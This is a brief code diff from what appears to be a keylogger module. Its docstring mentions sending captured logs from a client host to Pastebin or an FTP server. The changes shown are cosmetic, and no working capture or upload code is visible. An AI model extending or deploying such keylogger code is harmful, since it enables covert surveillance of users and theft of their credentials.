@@ -40,7 +40,6 @@ client host machine and optionally upload them to Pastebin
 or an FTP server
 """
 
-# main
 def _event(event):
     global logs
     global window
@@ -98,3 +97,4 @@ def run():
         return threads['keylogger']
     except Exception as e:
         util.log(str(e))
+
